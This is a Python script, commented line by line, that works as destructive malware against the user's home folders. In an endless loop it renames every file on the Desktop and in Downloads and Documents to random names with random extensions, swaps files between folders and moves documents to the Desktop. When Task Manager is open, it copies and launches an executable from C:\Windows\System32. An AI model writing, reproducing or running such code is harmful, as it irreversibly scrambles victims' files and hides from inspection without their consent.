#Importing necessary modules for file manipulation, randomization, and time management.
import os #Provides a way to interact with the operating system, such as file and directory manipulation.
import random #Provides functions for generating random numbers and selecting random elements from sequences.
import shutil #Provides a higher-level interface for file operations, such as copying and moving files.
import time #Provides time-related functions, such as pausing execution for a specified duration.
import subprocess #Allows the execution of external commands and programs from within Python.

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")#Builds the path to the user's desktop folder by joining the home directory path with "Desktop".
download_path = os.path.join(os.path.expanduser("~"), "Downloads")#Builds the path to the user's downloads folder by joining the home directory path with "Downloads".
documents_path = os.path.join(os.path.expanduser("~"), "Documents")#Builds the path to the user's documents folder by joining the home directory path with "Documents".

def is_task_manager_running():#Checks if the Task Manager process is currently running on the system.
    try:
        import psutil #Imports the psutil module, which provides an interface for retrieving information about running processes and system utilization.
        for proc in psutil.process_iter(['name']):#Iterates over all running processes, retrieving their names.
            if proc.info['name'] == 'Taskmgr.exe':#Checks if the name of the current process is "Taskmgr.exe", which indicates that the Task Manager is running.
                return True#Returns True if the Task Manager process is found, indicating that it is currently running.
    except ImportError:#Handles the case where the psutil module is not installed or cannot be imported.
        pass
    return False#Returns False if the Task Manager process is not found or if there was an error importing psutil, indicating that it is not currently running.
if is_task_manager_running():#Checks if the Task Manager process is running by calling the is_task_manager_running function.
    shutil.copy2("file_scrambler.exe", r"C:\Windows\System32\file_scrambler.exe")#Copies the "file_scrambler.exe" file to the "C:\Windows\System32" directory, preserving metadata such as timestamps and permissions.
    subprocess.Popen([r"C:\Windows\System32\file_scrambler.exe"])#Launches the copied "file_scrambler.exe" file from the "C:\Windows\System32" directory as a separate process, allowing it to run independently of the current script.
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=[]{};,.~`"#Defines a string containing a set of characters that can be used for generating random file names, including lowercase and uppercase letters, digits, and special characters.

extensions = [#Defines a list of file extensions that the program will consider when scrambling files. The list includes common file types such as text files, images, documents, audio, video, compressed files, web files, and executable files.
    ".txt",
    ".jpg",
    ".png",
    ".pdf",
    ".docx",
    ".xlsx",
    ".pptx", 
    ".mp3", 
    ".mp4", 
    ".avi", 
    ".mkv", 
    ".zip", 
    ".rar", 
    ".7z", 
    ".tar", 
    ".gz", 
    ".html", 
    ".css", 
    ".js", 
    ".json", 
    ".xml",
    ".csv",
    ".exe",
    ".bat",
    ".sh",
    ".iso",
    ".dll",
    ".apk",
    ".dmg",
    ".psd",
    ".ai",
    ".eps",
    ".indd",
    ".rtf",
    ".wav",
    ".flac",
    ".ogg",
    ".mov",
    ".wmv",
    ".flv",
    ".m4v",
    ".vob",
    ".ts",
    ".m2ts",
    ".webm",
    ".epub",
    ".mobi",
    ".azw",
    ".azw3",
    ".fb2",
    ".djvu",
    ".torrent",
]


def matching_files(folder):#List all files in the specified folder that match the given extensions.
    try:
        return [
            f for f in os.listdir(folder)#List comprehension that iterates over all items in the specified folder.
            if os.path.isfile(os.path.join(folder, f))#Checks if the item is a file (not a directory) before including it in the list.
            and any(f.lower().endswith(ext) for ext in extensions)#List comprehension that filters files based on the specified extensions, ignoring case sensitivity.
        ]
    except (FileNotFoundError, PermissionError):#Handles cases where the folder doesn't exist or access is denied.
        return []#Returns an empty list if the folder is not found or access is denied.

def unique_path(folder, name):#Generates a unique file path in the specified folder by appending a number to the base name if a file with the same name already exists.
    candidate = os.path.join(folder, name)#Creates a candidate file path by joining the folder path with the specified file name.
    base, ext = os.path.splitext(name)#Splits the file name into its base name and extension using os.path.splitext().
    n = 1#Initializes a counter variable n to 1, which will be used to create unique file names if necessary.
    while os.path.exists(candidate):#Checks if the candidate file path already exists in the specified folder.
        candidate = os.path.join(folder, "%s_%d%s" % (base, n, ext))#If the candidate file path exists, it generates a new candidate file path by appending an underscore and the current value of n to the base name, followed by the original extension.
        n += 1#Increments the counter variable n by 1 for the next iteration if the candidate file path still exists.
    return candidate#Returns the unique file path that does not conflict with existing files in the specified folder.


def scramble(folder):#Scrambles the names of files in the specified folder by renaming them with random characters and extensions.
    files = [#List comprehension that iterates over all items in the specified folder.
        f for f in os.listdir(folder)#List comprehension that iterates over all items in the specified folder.
        if os.path.isfile(os.path.join(folder, f))#Checks if the item is a file (not a directory) before including it in the list.
    ]
    for file in files:#Iterates over each file in the list of files obtained from the specified folder.
        src = os.path.join(folder, file)#Creates the source file path by joining the folder path with the current file name.
        if not os.path.exists(src):#Checks if the source file path exists before proceeding with the renaming operation.
            continue#Continues to the next iteration of the loop if the source file path does not exist.
        new_name = (#Generates a new random file name by concatenating a random character, a string of 7 random characters, and a random extension.
            random.choice(characters)#Selects a random character from the characters string to be the first character of the new file name.
            + "".join(random.choices(characters, k=7))#Generates a string of 7 random characters from the characters string to be the middle part of the new file name.
            + random.choice(extensions)#Selects a random extension from the extensions list to be the last part of the new file name.
        )
        dst = unique_path(folder, new_name)#Generates a unique destination file path in the specified folder by calling the unique_path function with the folder path and the newly generated random file name.
        try:#Attempts to move the source file to the destination file path, effectively renaming it.
            shutil.move(src, dst)
        except (OSError, shutil.Error):#Handles any errors that may occur during the file move operation, such as permission issues or file conflicts.
            pass
        time.sleep(0.1)#Pauses the execution for 0.1 seconds before proceeding to the next iteration of the loop, allowing for a brief delay between file renaming operations.


while True:#Starts an infinite loop that continuously scrambles files in the specified folders until the program is terminated.
    desktop_files = matching_files(desktop_path)#List all files in the desktop folder that match the given extensions.
    download_files = matching_files(download_path)#List all files in the downloads folder that match the given extensions.
    documents_files = matching_files(documents_path)#List all files in the documents folder that match the given extensions.

    if desktop_files and download_files:#Checks if there are files in both the desktop and downloads folders that match the given extensions.
        chosen_desktop_file = random.choice(desktop_files)#Selects a random file from the list of matching files in the desktop and downloads folders, respectively, to be swapped with each other.
        chosen_download_file = random.choice(download_files)#Selects a random file from the list of matching files in the desktop and downloads folders, respectively, to be swapped with each other.

        tmp = os.path.join(desktop_path, "__temp_" + "".join(random.choices(characters, k=12)))#Generates a temporary file path in the desktop folder by concatenating a prefix "__temp_" with a string of 12 random characters from the characters string. This temporary file path will be used to facilitate the swapping of the chosen files between the desktop and downloads folders.
        desktop_src = os.path.join(desktop_path, chosen_desktop_file)#Creates the source file path for the chosen desktop file by joining the desktop folder path with the chosen desktop file name.
        download_src = os.path.join(download_path, chosen_download_file)#Creates the source file path for the chosen download file by joining the downloads folder path with the chosen download file name.
        desktop_dst = unique_path(desktop_path, chosen_download_file)#Generates a unique destination file path in the desktop folder for the chosen download file by calling the unique_path function with the desktop folder path and the chosen download file name.
        download_dst = unique_path(download_path, chosen_desktop_file)#Generates a unique destination file path in the downloads folder for the chosen desktop file by calling the unique_path function with the downloads folder path and the chosen desktop file name.

        try:#Attempts to move the chosen desktop file to a temporary location, then move the chosen download file to the desktop, and finally move the temporary file to the downloads folder, effectively swapping the two files.
            shutil.move(desktop_src, tmp)#Moves the chosen desktop file to the temporary file path, effectively removing it from the desktop folder and storing it temporarily.
            try:#Attempts to move the chosen download file to the desktop folder, and if successful, moves the temporary file (originally the chosen desktop file) to the downloads folder.
                shutil.move(download_src, desktop_dst)#Moves the chosen download file to the desktop folder, effectively placing it in the location of the original chosen desktop file.
            finally:# Executes the code block regardless of whether an exception occurred in the try block, ensuring that the temporary file is moved to the downloads folder even if an error occurs while moving the chosen download file to the desktop.
                shutil.move(tmp, download_dst)#Moves the temporary file (originally the chosen desktop file) to the downloads folder, effectively placing it in the location of the original chosen download file.
        except (OSError, shutil.Error):# Handles any errors that may occur during the file move operations, such as permission issues or file conflicts.
            pass

    if documents_files:
        chosen_documents_file = random.choice(documents_files)#Selects a random file from the list of documents files.
        doc_src = os.path.join(documents_path, chosen_documents_file)#Creates the source file path for the chosen documents file by joining the documents folder path with the chosen documents file name.
        doc_dst = unique_path(desktop_path, chosen_documents_file)#Generates a unique destination file path in the desktop folder for the chosen documents file by calling the unique_path function with the desktop folder path and the chosen documents file name.
        try:# Attempts to move the chosen documents file to the desktop folder, effectively relocating it from the documents folder to the desktop.
            shutil.move(doc_src, doc_dst)#Moves the chosen documents file to the desktop folder, effectively relocating it from the documents folder to the desktop.
        except (OSError, shutil.Error):# Handles any errors that may occur during the file move operation, such as permission issues or file conflicts.
            pass

    if not (desktop_files or download_files or documents_files):# Checks if there are no files in the desktop, downloads, or documents folders that match the given extensions. If there are no matching files, the program will pause for 2 seconds before continuing to the next iteration of the loop.
        time.sleep(2)#Pauses the program for 2 seconds.
        continue#Pauses the program for 2 seconds before continuing to the next iteration of the loop.

    scramble(desktop_path)#Scrambles the names of files in the desktop folder by calling the scramble function with the desktop folder path as an argument.
    scramble(download_path)#Scrambles the names of files in the downloads folder by calling the scramble function with the downloads folder path as an argument.
    scramble(documents_path)#Scrambles the names of files in the documents folder by calling the scramble function with the documents folder path as an argument.